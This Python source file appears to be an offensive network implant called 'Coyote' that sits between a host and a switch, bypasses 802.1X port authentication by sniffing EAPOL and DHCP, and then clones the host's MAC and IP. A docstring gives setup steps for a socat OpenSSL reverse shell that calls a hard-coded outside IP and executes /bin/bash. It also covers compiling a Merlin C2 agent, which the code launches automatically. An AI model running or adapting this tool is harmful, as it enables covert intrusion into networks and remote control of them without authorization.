import os
import socket
import subprocess
from subprocess import call
from subprocess import Popen, PIPE
from scapy.all import *
from scapy.layers.inet import IP
from scapy.layers.l2 import Ether
from scapy.layers.eap import EAP
from scapy.layers.dhcp import DHCP


"""

# To remove DHCP service on attacking machine
update-rc.d -f dhcpd remove

# Set static IP's on the two interfaces
nano /etc/network/interfaces

# make sure old interface configs are deleted from /etc/network/interfaces

# Make sure DNS is set in /etc/resolv.conf

# Reverse Shell:
On attacking server:
    openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
    cat shell.key shell.crt > shell.pem
    openssl dhparam -out dhparams.pem 2048
    cat dhparams.pem >> shell.pem
    
    socat -d -d OPENSSL-LISTEN:443,cert=shell.pem,verify=0 STDOUT
    
    To Interact:
        Login to attacking server
        screen -x
        screen -x PID
        ctrl + A and then ctrl + D will soft exit, so you can re-use later
        
    Merlin-C2 Server:
        Just follow git instructions on copying, unzipping and running binary
    
On MITM Device:
    socat OPENSSL:44.241.183.149:443,verify=0 EXEC:/bin/bash
    
    MERLIN-C2 Agent:
        Make sure to use golang version 16 to compile the agent
    
        compile agent for Arm64 and Linux OS
            GOOS=linux GOARCH=arm64 /usr/local/go/bin/go build
        Transfer agent to host and run
             ./merlin-agent -url https://<IP of C2>
             
        From this agent we can kick off socat connections back to the C2 to get more interactive when need be


"""



class Coyote():

    def __init__(self):
        self.config = self.fetchConfig()  # Parse config file
        self.sockHost = ""
        self.sockNetwork = ""
        self.ifaceHost = "eth0"
        self.ifaceNetwork = "eth1"
        self.hostMAC = ""
        self.hostIP = ""
        self.hostMASK = ""
        self.hostGW = ""
        self.hostDNS = ""
        self.packetCounter = 0
        self.eapolPacketCounter = 0
        self.eapolSuccess = False
        self.trigger = False  # Tracks when MAC and IP are set from auto-search
        self.dhcp = False  # Tracks when DHCP ACK has been sent, signifying a successful DHCP request process
        self.dhcpICMP = False  # Trigger for ICMP packet sent post DHCP assignment
        self.countdown = 0  # Begins packet countdown DHCP assignment. Ensures DHCP has officially wrapped up on host
        self.ignoreHost = False
        self.ssh_host = self.config['ssh_host']
        self.ssh_local_host = self.config['ssh_local_host']
        self.ssh_port = self.config['ssh_port']
        self.ssh_user = self.config['ssh_username']
        self.ssh_key = self.config['ssh_key']

    def fetchConfig(self):  # Fetch Config File Parameters into array
        configuration_items = {}  # config array
        config = open("config.txt", "r")
        config = config.read()
        config = config.split('\n')
        for item in config:
            if "#" not in item and item != "":  # Ignore Comments and empty spaces
                item = item.split("=")
                configuration_items[item[0]] = item[1]

        return configuration_items

    def mitm(self):

        self.setSystemSettings()  # Config interfaces
        self.sockHost = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
        self.sockNetwork = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))

        try:
            self.sockHost.bind((self.ifaceHost, 0))
            self.sockNetwork.bind((self.ifaceNetwork, 0))
        except:
            print("=> You need 2 physical network interfaces to use Coyote!")

        self.inputs = [self.sockHost, self.sockNetwork]

        while True:
            try:
                inputready, outputready, exceptready = select.select(self.inputs, [], [])
            except select.error as e:
                break
            except socket.error as e:
                break
            for socketReady in inputready:
                # We check packets from iface1 and fwd them to iface2
                if socketReady == self.sockHost:
                    packet = self.sockHost.recvfrom(4096)  # Buffer needed to be extended to avoid fragmentation
                    pkt = packet[0]
                    dpkt = Ether(packet[0])

                    inspection = self.packetInspector(packet)   # Packet Inspector
                    if inspection:

                        if self.eapolSuccess and self.dhcp:

                            if 'ICMP' in dpkt:  # Check if ICMP pak has been sent post successful DHCP allocation
                                self.dhcpICMP = True

                            if self.dhcpICMP:  # If ICMP has been sent, begin countdown before NIC emulation
                                self.countdown += 1
                                if self.countdown >= 50:
                                    self.emulate()
                                    # Reset variables in case DHCP process repeats
                                    self.dhcp = False
                                    self.dhcpICMP = False
                                    self.countdown = 0

                        # Send the packet to the other interface
                        try:
                            self.sockNetwork.send(pkt)
                        except:
                            pass

                # Forward packet from iface2 to iface1
                if socketReady == self.sockNetwork:
                    packet = self.sockNetwork.recvfrom(4096)
                    pkt = packet[0]
                    dpkt = Ether(packet[0])

                    inspection = self.packetInspector(packet)  # Packet Inspector
                    if inspection:
                        if 'IP' in dpkt and (self.ignoreHost is True and dpkt[IP].src == self.ssh_host):  # Don't send packets back to host if the Coyote host is trying to talk to C2
                            pass
                        else:
                            try:
                                self.sockHost.send(pkt)
                            except Exception as error:
                                pass

    def packetInspector(self, packet):

        self.packetCounter += 1  # Iterate packet counter

        pkt = packet[0]
        dpkt = Ether(packet[0])

        if dpkt[Ether].src != "e4:5f:01:5a:31:10" and dpkt[Ether].src != "00:e0:4c:68:20:d8" and dpkt[Ether].src != "a0:ce:c8:19:b4:95":

            if 'EAPOL' in Ether(pkt):
                print("=> EAPOL packet")

                self.ignoreHost = False  # Start transmitting to host again

                # parse EAPOL for Success Message
                eapol = bytes(EAP(pkt))
                response = eapol[18:19]  #  EAPOL response - x03 for SUCCESS

                if response == b'\x03':  # If EAPOL returns a x03 and indicates successful authentication
                    print("[+] EAPOL SUCCEEDED! Fetching HOST Info from DHCP")
                    self.eapolSuccess = True

                self.eapolPacketCounter += 1

            if 'DHCP' in Ether(pkt) and 'ICMP' not in Ether(pkt):
                print("=> DHCP Packet")
                if dpkt.getlayer(DHCP).fields['options'][0][1] == 5:
                    print("=> DHCP ACK Found")
                    self.hostIP = dpkt[IP].dst
                    self.hostMAC = dpkt[Ether].dst
                    self.hostGW = self.get_dhcp_option(dpkt.getlayer(DHCP).fields['options'], 'router')
                    self.hostDNS = self.get_dhcp_option(dpkt.getlayer(DHCP).fields['options'], 'name_server')
                    self.hostMASK = self.get_dhcp_option(dpkt.getlayer(DHCP).fields['options'], 'subnet_mask')
                    print("[+] Host GW: " + str(self.hostGW))
                    print("[+] Host DNS: " + str(self.hostDNS))
                    print("[+] Host IP: " + str(self.hostIP))
                    print("[+] Host MAC: " + str(self.hostMAC))
                    self.dhcp = True

                return True

            return True

        else:
            print("Dropped Frame")
            return False

    def emulate(self):
        print("[+] Emulation has Begun!")
        call(["ifconfig", "eth0", "172.16.71.100", "netmask", "255.255.255.255", "broadcast", "192.168.1.255"])
        call(["ifconfig", "eth1", self.hostIP, "netmask", self.hostMASK])
        # TODO Need to set DNS automatically -- difficult as it requires a network reset
        call(["ifconfig", "eth1", "down"])
        call(["ifconfig", "eth1", "hw", "ether", self.hostMAC])
        call(["ifconfig", "eth1", "up"])
        time.sleep(8)  # Int may need to manipulated depending on attacking system cpu speed
        print("[+] Emulation Configured")
        print("[+] Adding Default Route")
        os.system("route add default gw " + self.hostGW + " eth1")

        self.ignoreHost = True  # Stop transmitting to host

        print("[+] Starting Reverse Shell")
        CoyoteThread = threading.Thread(target=self.revShell, args=())
        CoyoteThread.daemon = True
        CoyoteThread.start()

    def setSystemSettings(self):  # Configure requirements
        subprocess.run(["sysctl", "net.ipv4.ipforward=1"])
        subprocess.run(["ifconfig", "eth0", "promisc"])
        subprocess.run(["ifconfig", "eth1", "promisc"])

    # Extract dhcp_options by key
    def get_dhcp_option(self, dhcp_options, key):

        must_decode = ['hostname', 'domain', 'vendor_class_id']
        try:
            for i in dhcp_options:
                if i[0] == key:
                    # If DHCP Server Returned multiple name servers
                    # return all as comma separated string.
                    if key == 'name_server' and len(i) > 2:
                        return ",".join(i[1:])
                    # domain and hostname are binary strings,
                    # decode to unicode string before returning
                    elif key in must_decode:
                        return i[1].decode()
                    else:
                        return i[1]
        except:
            pass

    def revShell(self):

        try:
            #shell = subprocess.Popen(["socat", "OPENSSL:<ip>:443,verify=0", "EXEC:/bin/bash"], stdin=PIPE, stdout=PIPE)
            shell = os.system("cd /mnt/win_share/Coyote && ./merlin-agent -url https://<ip>")
            print("    [+] Reverse Shell Established. Enjoy!")
        except Exception as err:
            print("[+] Reverse Shell Failed -> " + str(err))


if __name__ == '__main__':
    run = Coyote()
    run.mitm()
